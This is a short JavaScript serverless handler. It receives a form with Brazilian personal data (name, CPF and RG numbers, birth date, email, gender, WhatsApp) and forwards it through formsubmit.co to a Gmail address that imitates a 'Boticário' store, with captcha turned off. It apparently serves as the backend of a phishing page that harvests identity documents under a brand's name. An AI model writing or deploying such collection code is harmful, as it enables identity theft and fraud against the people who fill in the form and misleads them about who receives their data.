export default async function handler(req, res) {

  if (req.method !== "POST") {
    return res.status(405).json({
      error: "Método não permitido"
    });
  }

  try {

    const { nome, cpf, rg, nasc, email, genero, whats } = req.body;

    const response = await fetch("https://formsubmit.co/ajax/lojaboticario00@gmail.com", {

      method: "POST",

      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json"
      },

      body: JSON.stringify({

        nome: nome,
        cpf: cpf,
        rg: rg,
        nascimento: nasc,
        email: email,
        genero: genero,
        whatsapp: whats,

        _subject: "Novo Cadastro",
        _captcha: "false"

      })

    });

    const data = await response.text();

    console.log(data);

    return res.status(200).json({
      success: true,
      data
    });

  } catch (err) {

    console.error(err);

    return res.status(500).json({
      error: err.message
    });

  }

}
